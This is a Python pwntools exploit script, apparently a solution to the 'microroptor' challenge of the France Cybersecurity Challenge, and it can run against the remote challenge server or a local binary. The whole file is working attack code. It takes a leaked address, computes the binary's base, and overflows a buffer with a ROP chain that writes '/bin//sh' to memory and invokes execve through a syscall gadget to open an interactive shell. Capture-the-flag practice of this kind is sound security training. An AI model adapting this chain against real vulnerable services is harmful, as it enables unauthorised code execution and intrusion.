#!/usr/bin/env python3

from pwn import *

exe = ELF("./microroptor")

context.binary = exe.path

if args.REMOTE:
    NL = b"\r\n"
else:
    NL = b"\n"


def conn():
    if args.REMOTE:
        r = remote("challenges.france-cybersecurity-challenge.fr", 2052)
    else:
        r = process([exe.path])

    return r



def main():
    global r


    ret = 0x0000000000001016 #ret
    pop_rdi = 0x000000000000116f #pop rdi ; ret
    pop_rsi = 0x0000000000001249 #pop rsi ; pop r15 ; ret
    pop_rdx = 0x0000000000001171 #pop rdx ; ret
    pop_rax = 0x000000000000116d #pop rax ; ret
    mov = 0x0000000000001169 # mov qword ptr [rdi], rax ; ret
    syscall = 0x0000000000001173 #syscall

    metallica_base  = 0x04010

    r = conn()

    metallica_addr = int(r.recv().decode(), 16)

    log.info("Leak : 0x{:2x}".format(metallica_addr))

    offset = metallica_addr - metallica_base

    ret_addr = ret + offset
    pop_rdi_addr = pop_rdi + offset
    pop_rsi_addr = pop_rsi + offset
    pop_rax_addr = pop_rax + offset
    mov_addr = mov + offset
    syscall_addr = syscall + offset

    payload = b'm3t4ll1cA'
    payload += b'A' * (16 - len(payload))

    payload += p64(0x9090909090909090) * 3


    payload += p64(pop_rdi_addr)
    payload += p64(metallica_addr)
    payload += p64(pop_rax_addr)
    payload += b'/bin//sh'
    payload += p64(mov_addr)

    payload += p64(pop_rax_addr)
    payload += p64(0x3b)
    payload += p64(pop_rdi_addr)
    payload += p64(metallica_addr)

    payload += p64(pop_rsi_addr)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(syscall_addr)

    log.info("Payload length : "  + str(len(payload)))


    r.send(payload + NL)
    rep = r.recv()
    print(rep)


    r.interactive()

    r.close()

if __name__ == "__main__":
    main()
